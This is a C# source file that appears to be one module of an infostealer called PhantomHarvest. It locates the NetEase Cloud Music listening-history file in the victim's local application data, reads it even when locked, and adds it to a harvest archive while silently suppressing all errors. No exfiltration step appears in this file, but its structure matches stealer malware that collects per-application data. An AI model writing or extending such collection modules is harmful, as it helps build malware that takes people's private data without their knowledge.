using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Softwares
{
	internal class NeteaseCloudMusic
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\CloudMusic\\webdata\\file");
				if (Directory.Exists(path))
				{
					foreach (string file in Directory.GetFiles(path, "history"))
					{
						try
						{
							byte[] bytes = LockedFile.ReadLockedFile(file);
							if (bytes != null)
							{
								using (MemoryStream ms = new MemoryStream(bytes))
								{
									zip.AddStream(ArchiveManager.Compression.Deflate, SoftwareName + "/history.dat", ms, DateTime.Now, "");
								}
							}
						}
						catch {}
					}
				}
			}
			catch
			{
			}
		}

		public static string SoftwareName = "NeteaseCloudMusic";
	}
}
